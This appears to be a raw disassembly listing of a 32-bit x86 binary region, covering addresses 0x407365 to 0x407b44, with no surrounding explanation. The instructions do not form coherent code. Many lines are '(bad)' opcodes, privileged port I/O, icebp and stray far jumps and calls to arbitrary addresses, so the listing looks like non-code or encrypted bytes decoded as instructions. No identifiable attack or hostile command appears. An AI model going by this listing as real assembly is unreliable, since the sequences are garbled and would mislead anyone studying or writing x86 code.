  407365:	push   edx
  407366:	test   eax,0x17858f56
  40736b:	into   
  40736c:	and    BYTE PTR [edi],0x90
  40736f:	xor    DWORD PTR [ebx],ecx
  407371:	icebp  
  407372:	mov    esp,0xed342bce
  407377:	mov    ah,0x34
  407379:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40737a:	mov    edi,0xf1b118bb
  40737f:	jbe    0x407398
  407381:	cmp    eax,0xbc22740e
  407386:	lods   eax,DWORD PTR ds:[esi]
  407387:	inc    esi
  407388:	call   0xdfa3:0xd6a148a1
  40738f:	shl    DWORD PTR [edx-0x73b02526],1
  407395:	int    0xc
  407397:	add    esp,DWORD PTR [edi+0x3b]
  40739a:	and    dh,ch
  40739c:	push   esp
  40739d:	cmp    BYTE PTR [ebx],ah
  40739f:	and    BYTE PTR [esi+0x2d],0xd2
  4073a3:	nop
  4073a4:	(bad)  
  4073a5:	push   edi
  4073a6:	xchg   edx,eax
  4073a7:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4073a9:	loopne 0x4073b7
  4073ab:	out    0x5,eax
  4073ad:	inc    ebp
  4073ae:	mov    ebp,DWORD PTR [eax+0x6e82efcd]
  4073b4:	and    edx,DWORD PTR [edx-0x57]
  4073b7:	ss pop esp
  4073b9:	sti    
  4073ba:	(bad)  
  4073bb:	adc    ebp,DWORD PTR [ecx+0x639377f5]
  4073c1:	mov    ebp,ecx
  4073c3:	jl     0x407395
  4073c5:	in     al,0xfd
  4073c7:	and    eax,0x374e9e35
  4073cc:	push   ecx
  4073cd:	inc    edi
  4073ce:	test   al,0x8f
  4073d0:	mov    BYTE PTR [ebx+0x7f5bf8f6],dl
  4073d6:	jmp    0x78989655
  4073db:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4073dc:	into   
  4073dd:	js     0x40735f
  4073df:	sbb    dl,BYTE PTR [edi+esi*8+0x75]
  4073e3:	jp     0x4073ad
  4073e5:	out    dx,al
  4073e6:	pop    esi
  4073e7:	in     al,0x3b
  4073e9:	add    DWORD PTR [esi-0x51],edi
  4073ec:	sub    esi,DWORD PTR [edx-0x7f]
  4073ef:	fcom   st(3)
  4073f1:	jbe    0x407467
  4073f3:	sub    ch,0x56
  4073f6:	outs   dx,DWORD PTR ds:[esi]
  4073f7:	mov    ecx,0xc41b2c5f
  4073fc:	out    0x42,eax
  4073fe:	icebp  
  4073ff:	pmulhuw mm4,QWORD PTR [edx+0x6b]
  407403:	out    dx,eax
  407404:	fs pushf 
  407406:	call   0x5b79256
  40740b:	dec    edi
  40740c:	fwait
  40740d:	shr    DWORD PTR [ebp+ebx*2+0x7b],0x8f
  407412:	jns    0x40748c
  407414:	gs sahf 
  407416:	or     eax,0xa6961634
  40741b:	pop    ebp
  40741c:	(bad)  
  40741d:	push   esp
  40741e:	stos   BYTE PTR es:[edi],al
  40741f:	iret   
  407420:	lods   eax,DWORD PTR ds:[esi]
  407421:	stos   BYTE PTR es:[edi],al
  407422:	sbb    bl,BYTE PTR [esi-0x7a]
  407425:	or     cl,cl
  407427:	adc    esi,DWORD PTR ds:0x8060da92
  40742d:	xor    al,0x7a
  40742f:	(bad)  
  407430:	jmp    FWORD PTR [eax-0x1530d868]
  407436:	test   eax,0xd4095b32
  40743b:	fs out 0x79,al
  40743e:	adc    ebp,DWORD PTR [ebp-0xbca06c6]
  407444:	arpl   WORD PTR [ebp-0x4a],bp
  407447:	dec    edx
  407448:	pop    edx
  407449:	adc    DWORD PTR [eax-0x21],edx
  40744c:	mov    fs,WORD PTR [edi+0x40e1ddb1]
  407452:	and    bh,BYTE PTR [ebx+edx*1+0x41]
  407456:	adc    esp,DWORD PTR [edi-0x748caea2]
  40745c:	jmp    0x407495
  40745e:	or     DWORD PTR [eax],ecx
  407460:	div    DWORD PTR [eax+0x6e7552ad]
  407466:	into   
  407467:	inc    ebp
  407468:	dec    esp
  407469:	jmp    0x16782114
  40746e:	jns    0x4074da
  407470:	mov    ch,0x41
  407472:	mov    bh,BYTE PTR [esi-0x5]
  407475:	push   ebp
  407476:	cmc    
  407477:	pop    ebx
  407478:	push   ebx
  407479:	xor    dh,BYTE PTR [ecx-0x63]
  40747c:	and    BYTE PTR [esi-0xc],ah
  40747f:	sbb    ecx,esp
  407481:	jns    0x407487
  407483:	cld    
  407484:	xchg   edi,eax
  407485:	lock icebp 
  407487:	push   esp
  407488:	cmp    eax,0x846b8ece
  40748d:	and    eax,0x7916a643
  407492:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407493:	bound  esp,QWORD PTR [ecx+0x50070aef]
  407499:	lods   al,BYTE PTR ds:[esi]
  40749a:	loop   0x40747c
  40749c:	xlat   BYTE PTR ds:[ebx]
  40749d:	aam    0x77
  40749f:	mov    DWORD PTR [edi+esi*8],ecx
  4074a2:	jbe    0x40747d
  4074a4:	or     eax,0x97ed8ca1
  4074a9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4074aa:	pop    esp
  4074ab:	dec    ecx
  4074ac:	xchg   edi,eax
  4074ad:	push   esi
  4074ae:	mov    ebx,DWORD PTR [edi]
  4074b0:	jecxz  0x4074c2
  4074b2:	and    eax,0x144fc82c
  4074b7:	pop    ecx
  4074b8:	xor    al,0x0
  4074ba:	or     al,0x77
  4074bc:	sbb    al,dl
  4074be:	addr16 mov edx,0x67c44c21
  4074c4:	fidivr WORD PTR [eax]
  4074c6:	inc    ebx
  4074c7:	sbb    al,0x4e
  4074c9:	frstor [edi-0x4c]
  4074cc:	inc    esi
  4074cd:	cmp    eax,0x1ca3f72d
  4074d2:	jmp    0x407463
  4074d4:	les    ebp,FWORD PTR [edi-0x59]
  4074d7:	jnp    0x407538
  4074d9:	fmul   DWORD PTR ds:0x8c97aa18
  4074df:	bnd jle 0x4074fe
  4074e2:	ja     0x4074bd
  4074e4:	xor    DWORD PTR [ebp+0x4],ebx
  4074e7:	aam    0x84
  4074e9:	hlt    
  4074ea:	jle    0x40753f
  4074ec:	adc    eax,0x2276df
  4074f1:	and    al,0x97
  4074f3:	mov    ecx,DWORD PTR [ebp+0x1b]
  4074f6:	jbe    0x4074f7
  4074f8:	retf   
  4074f9:	outs   dx,BYTE PTR ds:[esi]
  4074fa:	into   
  4074fb:	inc    edx
  4074fc:	out    dx,al
  4074fd:	cmp    bh,BYTE PTR [ebx]
  4074ff:	xchg   BYTE PTR [edx+0x511854e5],al
  407505:	lods   eax,DWORD PTR ds:[esi]
  407506:	mov    ecx,0xe58f2e9f
  40750b:	test   DWORD PTR [eax-0x1a9d3847],ebp
  407511:	scas   al,BYTE PTR es:[edi]
  407512:	inc    edi
  407513:	das    
  407514:	popa   
  407515:	(bad)  
  407516:	(bad)  
  407517:	fdivr  QWORD PTR [edi-0x16cf24f2]
  40751d:	mov    esi,0x9fd1031e
  407522:	sub    eax,0xb0166442
  407527:	xchg   edi,eax
  407528:	into   
  407529:	retf   0x8c11
  40752c:	sbb    eax,0xe56a5a2e
  407531:	xchg   ecx,eax
  407532:	adc    DWORD PTR [edi+edi*8-0x14],0xffffffd1
  407537:	mov    ebp,0x8556a07b
  40753c:	push   ss
  40753d:	cld    
  40753e:	jecxz  0x407588
  407540:	jmp    0xd92f:0x912dd5f1
  407547:	push   0x76
  407549:	(bad)  
  40754a:	in     eax,0xe2
  40754c:	in     al,0x48
  40754e:	xchg   ch,ch
  407550:	es ds jg 0x4075c0
  407554:	sub    dh,BYTE PTR [esi]
  407556:	mov    bl,0x45
  407558:	push   ebp
  407559:	dec    eax
  40755a:	jmp    0x212180c1
  40755f:	stc    
  407560:	ds adc eax,0x332bbd3d
  407566:	jne    0x4075e2
  407568:	sbb    dh,BYTE PTR [edx+0x3e]
  40756b:	aad    0xb9
  40756d:	mov    DWORD PTR [edi+0x4f],eax
  407570:	scas   eax,DWORD PTR es:[edi]
  407571:	ffreep st(4)
  407573:	xor    al,0xbd
  407575:	sar    DWORD PTR [ebp-0x1],1
  407578:	ss (bad) 
  40757a:	dec    ecx
  40757b:	call   FWORD PTR [edx]
  40757d:	xchg   edi,eax
  40757e:	jmp    0x9c77:0xdacb7c68
  407585:	cmp    DWORD PTR [ecx+0x67a964fd],eax
  40758b:	add    bh,BYTE PTR [ebx+ebp*2+0x1bc9033f]
  407592:	mov    bh,0xb5
  407594:	pop    edi
  407595:	pop    edi
  407596:	and    eax,0xcfe2d83f
  40759b:	repnz in al,dx
  40759d:	and    ah,ch
  40759f:	pop    ebp
  4075a0:	push   0x50bc9559
  4075a5:	mov    eax,0x267df00a
  4075aa:	jb     0x4075bf
  4075ac:	push   cs
  4075ad:	sti    
  4075ae:	cdq    
  4075af:	ins    DWORD PTR es:[edi],dx
  4075b0:	mov    esp,0xb85852f3
  4075b5:	stos   BYTE PTR es:[edi],al
  4075b6:	ins    BYTE PTR es:[edi],dx
  4075b7:	mov    dh,0x5a
  4075b9:	fwait
  4075ba:	cmp    BYTE PTR ds:0xba510f13,ah
  4075c0:	test   eax,0x2c35d7a4
  4075c5:	or     al,BYTE PTR [ebx+edx*8-0x30]
  4075c9:	in     al,0x1c
  4075cb:	adc    al,0x73
  4075cd:	ds enter 0x9b26,0xb7
  4075d2:	or     BYTE PTR [ecx+0x25],0x2c
  4075d6:	fdivr  QWORD PTR [ecx+0x26246790]
  4075dc:	sbb    al,0xae
  4075de:	inc    eax
  4075df:	jne    0x407584
  4075e1:	idiv   BYTE PTR [edi]
  4075e3:	add    DWORD PTR [esp+eiz*8+0x69e9faf4],ecx
  4075ea:	jmp    FWORD PTR [eax-0x679a8096]
  4075f0:	sub    BYTE PTR [ebx],ah
  4075f2:	jb     0x4075fb
  4075f4:	sbb    ecx,DWORD PTR [ebx]
  4075f6:	lock sbb edx,DWORD PTR [ebx]
  4075f9:	ss jl  0x4075a5
  4075fc:	adc    eax,0x9b27fa9a
  407601:	mov    es,WORD PTR [eax-0x2c]
  407604:	sti    
  407605:	hlt    
  407606:	or     ch,bl
  407608:	jmp    0x2c54:0x5f7bb329
  40760f:	push   esp
  407610:	cdq    
  407611:	inc    edx
  407612:	cwde   
  407613:	or     BYTE PTR [esi],dl
  407615:	clc    
  407616:	pusha  
  407617:	xlat   BYTE PTR ds:[ebx]
  407618:	daa    
  407619:	adc    BYTE PTR ds:0xcb12b2b,ch
  40761f:	sbb    al,0xd0
  407621:	push   eax
  407622:	sub    BYTE PTR [ebx],0x2c
  407625:	mov    cs,esi
  407627:	cld    
  407628:	lods   al,BYTE PTR ds:[esi]
  407629:	idiv   DWORD PTR [ebx+0x6c]
  40762c:	xor    eax,0xe700d631
  407631:	jnp    0x407668
  407633:	enter  0xaedd,0xe5
  407637:	sbb    BYTE PTR [edx+0x3981a845],ch
  40763d:	push   cs
  40763e:	xor    bl,dl
  407640:	jmp    0x722b:0xc700dc0c
  407647:	sub    DWORD PTR [edi],ecx
  407649:	das    
  40764a:	neg    BYTE PTR [ecx]
  40764c:	push   edi
  40764d:	and    BYTE PTR [ebx-0x195e4e70],cl
  407653:	lock xor DWORD PTR [edx],ecx
  407656:	sub    DWORD PTR [ebx+0x593f3292],edi
  40765c:	cmp    ebp,DWORD PTR [eax-0x1b]
  40765f:	adc    bh,ah
  407661:	daa    
  407662:	(bad)  
  407664:	mov    DWORD PTR [eax-0x3c],edi
  407667:	(bad)  
  407668:	push   0xb84c4ada
  40766d:	sahf   
  40766e:	ds inc esi
  407670:	or     esi,DWORD PTR [eax]
  407672:	jecxz  0x4076df
  407674:	add    DWORD PTR [edx-0x6110188e],0xffffff9e
  40767b:	xlat   BYTE PTR ds:[ebx]
  40767c:	mov    esi,0xff2c0d34
  407681:	push   esi
  407682:	sub    bl,al
  407684:	imul   esi,ebp,0xffffffda
  407687:	jae    0x4076a7
  407689:	mov    ch,0x41
  40768b:	pusha  
  40768c:	rcr    BYTE PTR [esi],cl
  40768e:	(bad)  
  40768f:	cli    
  407690:	push   ebx
  407691:	das    
  407692:	(bad)  
  407693:	psraw  mm4,QWORD PTR [ebp+0x6a944386]
  40769a:	adc    al,0x8d
  40769c:	pop    ecx
  40769d:	lods   eax,DWORD PTR ds:[esi]
  40769e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40769f:	cmp    ebp,DWORD PTR [ecx+eiz*4+0x55]
  4076a3:	and    cl,BYTE PTR [ecx-0x5d]
  4076a6:	nop
  4076a7:	cmp    eax,0x1560eb7
  4076ac:	xor    al,0xb
  4076ae:	div    BYTE PTR [eax-0x23]
  4076b1:	and    eax,0xcfde15df
  4076b6:	sar    DWORD PTR [ebp+0x2b],cl
  4076b9:	js     0x407666
  4076bb:	pusha  
  4076bc:	adc    BYTE PTR [eax+0x43048825],ah
  4076c2:	dec    edi
  4076c3:	shl    bl,cl
  4076c5:	(bad)  
  4076c6:	push   edi
  4076c7:	and    DWORD PTR [edi+ebx*4-0x28fda476],esp
  4076ce:	cmp    ah,BYTE PTR [esi]
  4076d0:	mov    edi,0xf41b4e2d
  4076d5:	test   eax,0x1cc5f68b
  4076da:	add    DWORD PTR [esi-0x67],0x34
  4076de:	mov    esi,0x91b3ceec
  4076e3:	inc    esi
  4076e4:	mov    bh,0x56
  4076e6:	scas   al,BYTE PTR es:[edi]
  4076e7:	and    ah,BYTE PTR [ebx-0x75]
  4076ea:	and    dl,BYTE PTR [esi+0x5c]
  4076ed:	add    cl,BYTE PTR [esi-0x17]
  4076f0:	xor    dl,BYTE PTR [ebx]
  4076f2:	cmp    eax,0x402bebfd
  4076f7:	push   eax
  4076f8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4076f9:	inc    ebp
  4076fa:	xor    BYTE PTR [edx-0x5c4af312],0xcb
  407701:	out    dx,eax
  407702:	add    eax,0x3217efc7
  407707:	loope  0x407762
  407709:	add    dh,BYTE PTR [ecx+0x2d]
  40770c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40770d:	pop    edx
  40770e:	pop    esi
  40770f:	out    dx,al
  407710:	or     bl,dl
  407712:	mov    ds:0x34610645,eax
  407717:	mov    dl,BYTE PTR gs:[ebx]
  40771a:	cmp    dh,BYTE PTR [ecx+0x71]
  40771d:	inc    edx
  40771e:	mov    ah,0xac
  407720:	int3   
  407721:	or     eax,0x605f64a9
  407726:	icebp  
  407727:	mov    bl,0x71
  407729:	(bad)  
  40772a:	xchg   ebp,eax
  40772b:	pop    eax
  40772c:	cwde   
  40772d:	mov    al,0xb9
  40772f:	jg     0x4076cf
  407731:	cmp    BYTE PTR [ecx+eax*1-0x7b160232],dl
  407738:	push   0xffffff91
  40773a:	push   ds
  40773b:	rcl    BYTE PTR [ecx+0x2e],0xbb
  40773f:	loopne 0x4076d0
  407741:	pop    esp
  407742:	(bad)  
  407743:	rcl    eax,cl
  407745:	loope  0x407717
  407747:	or     ch,BYTE PTR [ecx-0x7aefb5a6]
  40774d:	(bad)  
  40774e:	and    ah,BYTE PTR ds:0x9c10f085
  407754:	and    DWORD PTR [ebx],edx
  407756:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407757:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407758:	add    dl,BYTE PTR [ecx]
  40775a:	xlat   BYTE PTR ds:[ebx]
  40775b:	push   es
  40775c:	cmp    esp,ebp
  40775e:	call   0xf2d08489
  407763:	(bad)  
  407764:	call   0xe4402e7
  407769:	inc    esi
  40776a:	sub    DWORD PTR [eax+0x935d6e0],esp
  407770:	ret    0x8d93
  407773:	push   0xfffffff5
  407775:	ss dec esi
  407777:	out    dx,al
  407778:	dec    esi
  407779:	push   esp
  40777a:	shr    BYTE PTR [esi-0x163e681d],1
  407780:	aam    0x9e
  407782:	ret    
  407783:	mov    al,0xdd
  407785:	pusha  
  407786:	test   BYTE PTR [ebx+0x6f],al
  407789:	cmp    dh,BYTE PTR [eax]
  40778b:	jns    0x40774f
  40778d:	int    0xd4
  40778f:	mov    ebp,0xb23347a2
  407794:	jbe    0x407779
  407796:	mov    edx,0xd63f67c9
  40779b:	push   ebx
  40779c:	mov    bh,0xd
  40779e:	(bad)  
  40779f:	sub    DWORD PTR [ecx-0x22],edi
  4077a2:	leave  
  4077a3:	out    dx,al
  4077a4:	mov    edi,0x839ccc80
  4077a9:	imul   edx,DWORD PTR [ecx],0x44
  4077ac:	adc    ebp,DWORD PTR [ecx+eax*1]
  4077af:	xor    ch,BYTE PTR [ebx+eax*4]
  4077b2:	out    0x8f,al
  4077b4:	int3   
  4077b5:	retf   0x2b23
  4077b8:	aad    0x9a
  4077ba:	clc    
  4077bb:	inc    ecx
  4077bc:	hlt    
  4077bd:	iret   
  4077be:	shl    DWORD PTR [eax],1
  4077c0:	sbb    edi,DWORD PTR [edx]
  4077c2:	js     0x407838
  4077c4:	and    BYTE PTR [eax],0x98
  4077c7:	int3   
  4077c8:	not    DWORD PTR ds:[ebx+0x35]
  4077cc:	retf   0xe0dd
  4077cf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4077d0:	sti    
  4077d1:	fbstp  TBYTE PTR [ecx+eiz*2-0x2a8e4e07]
  4077d8:	cld    
  4077d9:	jnp    0x4077d8
  4077db:	push   esi
  4077dc:	jne    0x4077ec
  4077de:	rcl    WORD PTR [ebp+eiz*4-0x19d81f78],0xa6
  4077e7:	or     BYTE PTR [ecx],bh
  4077e9:	lock adc al,0x71
  4077ec:	fisubr DWORD PTR [ebp+0x4af20ef1]
  4077f2:	cld    
  4077f3:	stos   DWORD PTR es:[edi],eax
  4077f4:	inc    edi
  4077f5:	call   0x8ea2e1ff
  4077fa:	loope  0x407847
  4077fc:	arpl   WORD PTR [edi-0x55],cx
  4077ff:	pop    esi
  407800:	push   ebp
  407801:	sub    BYTE PTR [edi+0x45],0xe8
  407805:	mov    WORD PTR [edi+edi*4-0x62cc6a1e],?
  40780c:	and    eax,0x77d3ad1d
  407811:	arpl   WORD PTR [ecx+0x583df4fa],di
  407817:	dec    ecx
  407818:	sbb    al,0xa8
  40781a:	into   
  40781b:	mov    esp,0xb69504b
  407820:	rcr    DWORD PTR [ebx-0x35],1
  407823:	and    al,0xbf
  407825:	leave  
  407826:	nop
  407827:	adc    edx,DWORD PTR [esi]
  407829:	jbe    0x4077d2
  40782b:	or     eax,0x28d96cfe
  407830:	pop    esp
  407831:	dec    ebp
  407832:	fs push es
  407834:	mov    WORD PTR [eax-0x4ffa674b],ds
  40783a:	sub    DWORD PTR [esi],eax
  40783c:	adc    DWORD PTR [esp+ebp*1],eax
  40783f:	add    DWORD PTR [edx],ebx
  407841:	sub    DWORD PTR [ebp-0xa],esi
  407844:	(bad)  
  407845:	in     eax,dx
  407846:	sbb    edx,DWORD PTR [ecx+0x71]
  407849:	mov    BYTE PTR [edi+0x47],bh
  40784c:	xchg   dl,ch
  40784e:	add    BYTE PTR [ecx+0x43f83c0],bh
  407854:	clc    
  407855:	inc    edx
  407856:	test   BYTE PTR ds:0x60dd83a8,cl
  40785c:	cdq    
  40785d:	xchg   esi,eax
  40785e:	push   eax
  40785f:	mov    ch,0x8d
  407861:	das    
  407862:	push   cs
  407863:	fistp  DWORD PTR [esp+ebx*8-0x7b]
  407867:	cmp    BYTE PTR [eax],ah
  407869:	mov    al,ds:0xd1bdd899
  40786e:	iret   
  40786f:	sar    DWORD PTR [esi-0x3e],cl
  407872:	repnz cmps BYTE PTR cs:[si],BYTE PTR es:[di]
  407876:	call   0xa24ce264
  40787b:	fcmovnb st,st(3)
  40787d:	stos   DWORD PTR es:[edi],eax
  40787e:	in     eax,0x7e
  407880:	fisubr WORD PTR [esi+0x42e3c521]
  407886:	stc    
  407887:	or     DWORD PTR [edx-0x30],ecx
  40788a:	pop    eax
  40788b:	adc    ch,BYTE PTR [edx+0x20]
  40788e:	pushf  
  40788f:	call   0xbe40:0x1fceda9d
  407896:	fwait
  407897:	aad    0x7b
  407899:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40789a:	dec    edi
  40789b:	inc    ebx
  40789c:	mov    dh,0x2e
  40789e:	(bad)  
  40789f:	outs   dx,DWORD PTR ds:[esi]
  4078a0:	lods   eax,DWORD PTR ds:[esi]
  4078a1:	sub    eax,0x6d1ea6e1
  4078a6:	mov    ebp,0x7de31485
  4078ab:	mov    ds:0xf22b5d53,eax
  4078b0:	or     ah,BYTE PTR [ebx+0x58]
  4078b3:	mov    cl,0x57
  4078b5:	xchg   ebx,eax
  4078b6:	adc    eax,0x24f5a821
  4078bb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4078bc:	pusha  
  4078bd:	lahf   
  4078be:	xor    al,0x8d
  4078c0:	enter  0x905f,0x1b
  4078c4:	sahf   
  4078c5:	idiv   BYTE PTR [edx]
  4078c7:	scas   al,BYTE PTR es:[edi]
  4078c8:	mov    ebp,0xc452e167
  4078cd:	sar    DWORD PTR [ebx+esi*4],0x6b
  4078d1:	jg     0x4078e6
  4078d3:	jne    0x407912
  4078d5:	mov    al,0xa
  4078d7:	retf   
  4078d8:	pop    ss
  4078d9:	aaa    
  4078da:	shl    DWORD PTR [edi],0xb6
  4078dd:	test   ebx,0x558b88a2
  4078e3:	test   DWORD PTR [ecx-0x18e62823],0x824a78a9
  4078ed:	ret    
  4078ee:	pop    eax
  4078ef:	sub    DWORD PTR [ebx+0x450c7f25],edx
  4078f5:	ficom  WORD PTR [esi]
  4078f7:	xor    eax,0xabc77e6d
  4078fc:	jecxz  0x4078b5
  4078fe:	jl     0x4078a2
  407900:	adc    al,0x3e
  407902:	lds    edx,FWORD PTR [edi]
  407904:	jmp    0xc1c09a53
  407909:	jle    0x407922
  40790b:	xchg   ebp,eax
  40790c:	les    edi,FWORD PTR [ecx+0x6d000bb]
  407912:	jmp    0x20522413
  407917:	pop    eax
  407918:	popf   
  407919:	imul   ecx,DWORD PTR ds:[esi-0x42],0x76f2263b
  407921:	xor    DWORD PTR [ecx-0x57],eax
  407924:	sbb    al,0xb2
  407926:	dec    edi
  407927:	add    ebp,DWORD PTR [ecx+0x4675a7b4]
  40792d:	test   al,0x6e
  40792f:	push   esp
  407930:	pop    edi
  407931:	push   0xd9cdeaf3
  407936:	pushf  
  407937:	test   eax,0xb930a064
  40793c:	and    eax,0xda32dea
  407941:	outs   dx,BYTE PTR ds:[esi]
  407942:	push   ebx
  407943:	mov    ds,WORD PTR [edi+0x6f]
  407946:	mov    bh,0x98
  407948:	xor    edi,ecx
  40794a:	cli    
  40794b:	scas   eax,DWORD PTR es:[edi]
  40794c:	sbb    al,0xd8
  40794e:	mov    dl,0xf
  407950:	jns    0x40798a
  407952:	push   esp
  407953:	sub    eax,0x11421d68
  407958:	(bad)  
  407959:	xchg   esi,eax
  40795a:	cdq    
  40795b:	cmp    DWORD PTR [ebp+edi*8-0x4cf6721],ecx
  407962:	jecxz  0x4079d1
  407964:	nop
  407965:	out    dx,eax
  407966:	std    
  407967:	rcr    DWORD PTR [eax+0x5c],1
  40796a:	inc    edx
  40796b:	popa   
  40796c:	or     eax,0x278f41f0
  407971:	(bad)  
  407972:	ja     0x4079b8
  407974:	cmp    DWORD PTR [ecx+eax*4-0x67],ebp
  407978:	mov    dl,BYTE PTR [ecx+0x4c72e989]
  40797e:	ficom  WORD PTR ds:0x4869e272
  407984:	test   BYTE PTR [ebp+ecx*1-0x6a],dl
  407988:	icebp  
  407989:	xchg   ebp,eax
  40798a:	retf   
  40798b:	call   0x88177e78
  407990:	mov    WORD PTR [ebx-0x3010aa46],gs
  407996:	in     al,dx
  407997:	rcr    DWORD PTR [ebx+0x3d],0xf7
  40799b:	lock push 0x0
  40799e:	dec    esp
  40799f:	pop    ebx
  4079a0:	call   0x6400:0xf56b6ed3
  4079a7:	sub    al,BYTE PTR [esp+ecx*2]
  4079aa:	in     al,dx
  4079ab:	fcmovb st,st(0)
  4079ad:	(bad)  
  4079ae:	fucomp st(0)
  4079b0:	dec    edx
  4079b1:	pop    esi
  4079b2:	ret    0x3371
  4079b5:	cld    
  4079b6:	scas   eax,DWORD PTR es:[edi]
  4079b7:	or     eax,0xafebab08
  4079bc:	in     eax,0x54
  4079be:	gs test eax,0xc9e75da7
  4079c4:	and    esi,ebp
  4079c6:	sub    eax,0xe74ab8e0
  4079cb:	mov    bh,0xf5
  4079cd:	lea    esp,[eax]
  4079cf:	(bad)  
  4079d0:	aam    0x6f
  4079d2:	stc    
  4079d3:	sar    BYTE PTR [ecx+0x53],0x46
  4079d7:	inc    edi
  4079d8:	in     eax,0xbd
  4079da:	icebp  
  4079db:	int    0x93
  4079dd:	in     al,dx
  4079de:	fwait
  4079df:	push   ecx
  4079e0:	aad    0xd
  4079e2:	mov    ch,0x9b
  4079e4:	and    eax,DWORD PTR [ecx-0x345d2a0a]
  4079ea:	loop   0x407a4b
  4079ec:	dec    esi
  4079ed:	inc    esi
  4079ee:	inc    ebp
  4079ef:	push   eax
  4079f0:	call   0x18ac:0x9637ac8c
  4079f7:	neg    BYTE PTR [edx]
  4079f9:	pop    ecx
  4079fa:	shl    BYTE PTR [ecx],cl
  4079fc:	(bad)  
  4079fd:	mov    bh,0x34
  4079ff:	retf   
  407a00:	mov    esp,0x84faa5db
  407a05:	shl    BYTE PTR [eax+0x1e],0xa3
  407a09:	sbb    al,0x22
  407a0b:	xor    ch,bl
  407a0d:	push   esi
  407a0e:	stos   BYTE PTR es:[edi],al
  407a0f:	inc    edi
  407a10:	push   eax
  407a11:	inc    ebp
  407a12:	mov    ds:0xae44b53e,eax
  407a17:	outs   dx,DWORD PTR ds:[esi]
  407a18:	sbb    esp,edx
  407a1a:	(bad)  
  407a1c:	mov    ds:0x5da83c69,al
  407a21:	mov    eax,0xafd6fdc0
  407a26:	pop    ss
  407a27:	dec    edx
  407a28:	es xor eax,0x5206105c
  407a2e:	in     al,0xea
  407a30:	cdq    
  407a31:	leave  
  407a32:	in     eax,0x17
  407a34:	or     DWORD PTR [ebp+ebx*2-0x6c],0xffffffae
  407a39:	jns    0x4079dc
  407a3b:	cli    
  407a3c:	ss inc edi
  407a3e:	mov    edi,0x9c848b69
  407a43:	mov    edx,0xa6adec5a
  407a48:	sub    eax,0x87ee9769
  407a4d:	xchg   ebx,eax
  407a4e:	mov    bh,BYTE PTR [eax]
  407a50:	mov    dh,ch
  407a52:	mov    ecx,0x4ca52fbc
  407a57:	xchg   ebp,eax
  407a58:	add    eax,0xbfccf665
  407a5d:	cmp    al,0x81
  407a5f:	scas   eax,DWORD PTR es:[edi]
  407a60:	pop    ebp
  407a61:	in     eax,dx
  407a62:	rcr    BYTE PTR [eax+edx*2],0xcc
  407a66:	retf   0x1963
  407a69:	iret   
  407a6a:	mov    bh,0xd8
  407a6c:	mov    ds:0xf66760d,eax
  407a71:	mov    esi,0xdee08411
  407a76:	and    ebp,DWORD PTR ds:0xdc09e3bc
  407a7c:	jns    0x407a1e
  407a7e:	(bad)  
  407a7f:	xchg   esi,eax
  407a80:	rcr    BYTE PTR [edi-0x28d6d590],1
  407a86:	jecxz  0x407a5d
  407a88:	cld    
  407a89:	adc    bl,BYTE PTR [edi]
  407a8b:	xchg   edx,eax
  407a8c:	out    dx,al
  407a8d:	mov    edx,0xf61151d9
  407a92:	sar    DWORD PTR [edx+esi*1-0x2f],cl
  407a96:	xchg   edx,eax
  407a97:	push   edx
  407a98:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407a99:	cld    
  407a9a:	cmp    al,0xe1
  407a9d:	dec    esi
  407a9e:	mov    cl,BYTE PTR [ebp-0x540dd818]
  407aa4:	cmp    DWORD PTR [edi+0x25989da8],ebx
  407aaa:	out    0x2c,eax
  407aac:	add    BYTE PTR [edx+0x527bbdbf],bl
  407ab2:	imul   esp,DWORD PTR [ecx+0x4f],0xffffffac
  407ab6:	jg     0x407a7c
  407ab8:	int    0x1c
  407aba:	xor    cl,bl
  407abc:	jg     0x407a59
  407abe:	jbe    0x407a80
  407ac0:	pop    eax
  407ac1:	inc    ebp
  407ac2:	test   eax,0x69620c7
  407ac7:	retf   0xb282
  407aca:	mov    eax,0xbc0deab4
  407acf:	sub    ch,dh
  407ad1:	div    BYTE PTR [ebx]
  407ad3:	cld    
  407ad4:	mov    ds:0xf88b75a7,eax
  407ad9:	dec    eax
  407ada:	cmp    eax,0x571856fb
  407adf:	add    eax,0xe07e67e5
  407ae4:	fsub   DWORD PTR [edi-0x38]
  407ae7:	inc    edx
  407ae8:	ror    BYTE PTR [ecx],0xe4
  407aeb:	adc    al,0x61
  407aed:	stos   DWORD PTR es:[edi],eax
  407aee:	sbb    BYTE PTR [esi-0x72],cl
  407af1:	add    al,0x26
  407af3:	into   
  407af4:	repz pop esp
  407af6:	pop    ss
  407af7:	xchg   ebp,eax
  407af8:	int3   
  407af9:	(bad)  
  407afa:	gs hlt 
  407afc:	xor    al,0x54
  407afe:	dec    esp
  407aff:	call   0x5b474b79
  407b04:	and    bl,BYTE PTR [ecx]
  407b06:	ins    BYTE PTR es:[di],dx
  407b08:	not    dh
  407b0a:	sbb    al,0xac
  407b0c:	sub    DWORD PTR [ecx],edx
  407b0e:	pop    ebx
  407b0f:	xchg   ebx,eax
  407b10:	mov    DWORD PTR [edx+0x14],esi
  407b13:	xchg   edi,eax
  407b14:	push   ss
  407b15:	and    edi,0xacf4b602
  407b1b:	iret   
  407b1c:	sbb    ah,cl
  407b1e:	sar    BYTE PTR [ebp+0x66eb775b],1
  407b24:	and    BYTE PTR [ebp+0x7d8d13f0],al
  407b2a:	and    DWORD PTR [edx+0x57],0x805b5dac
  407b31:	(bad)  
  407b32:	call   0x1f18:0xaa0bc9eb
  407b39:	ss pop ds
  407b3b:	push   cs
  407b3c:	mov    bh,0xd0
  407b3e:	ret    
  407b3f:	adc    eax,0x847824d6
  407b44:	cmp    ebp,DWORD PTR [ebx]
